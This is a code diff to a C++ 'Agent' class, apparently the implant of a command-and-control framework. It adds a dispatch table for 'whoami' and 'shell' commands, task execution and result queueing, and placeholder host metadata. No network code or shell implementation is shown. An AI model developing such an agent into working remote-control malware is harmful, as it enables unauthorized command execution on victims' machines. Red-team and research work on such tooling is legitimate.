@@ -1,10 +1,35 @@
 #include "Agent.h"
+#include "Commands.h"
 #include <iostream>
 #include <thread>
 #include <chrono>
+#include <unordered_map>
 
-Agent::Agent(const AgentMetadata& metadata){
-	Metadata = metadata;
+Agent::Agent(){
+	Metadata = generateMetadata();
+	Commands = loadCommands();
+
+}
+
+std::unordered_map<std::string, std::string(*)(std::string arguments)> Agent::loadCommands() {
+	std::unordered_map<std::string, std::string(*)(std::string arguments)> commands;
+
+	commands["whoami"] = &whoami;
+	commands["shell"] = &shell;
+
+	return commands;
+}
+AgentMetadata Agent::generateMetadata() {
+	AgentMetadata metadata = {
+		1,
+		"hostname",
+		"username",
+		"processname",
+		1337,
+		"integrity",
+		"arch"
+	};
+	return metadata;
 }
 
 AgentMetadata Agent::getMetadata(){
@@ -15,8 +40,8 @@ void Agent::addTask(const Task& task){
 	Tasks.push(task);
 }
 
-Task& Agent::getNextTask() {
-	Task& task = Tasks.front();
+Task Agent::getNextTask() {
+	Task task = Agent::Tasks.front();
 	Tasks.pop();
 
 	return task;
@@ -24,8 +49,8 @@ Task& Agent::getNextTask() {
 
 void Agent::addResult(const TaskResult& result) { Results.push(result); }
 
-TaskResult& Agent::getNextResult() {
-	TaskResult& result = Results.front();
+TaskResult Agent::getNextResult() {
+	TaskResult result = Results.front();
 	Results.pop();
 	return result;
 }
@@ -43,7 +68,15 @@ void Agent::executeTask(Task& task) {
 	std::cout << "Executing task: " << task.id << std::endl;
 
 	//Execute Command
-	std::string command_output = "Test output";
+	std::string command_output;
+	if (Agent::Commands.find(task.command) != Agent::Commands.end()) {
+		command_output = Commands[task.command](task.arguments);
+	}
+	else {
+		command_output = "Error ejecutando el comando";
+	}
+	
+	std::cout << "Commands Output: " << command_output << std::endl;
 	TaskResult result = { task.id, command_output };
 
 	Agent::addResult(result);
@@ -53,7 +86,7 @@ void Agent::Work() {
 	while (true) {
 		std::cout << "Working Tasks ...." << std::endl;
 		if (!Tasks.empty()) {
-			Task& task = Agent::getNextTask();
+			Task task = Agent::getNextTask();
 			Agent::executeTask(task);
 			
 		}
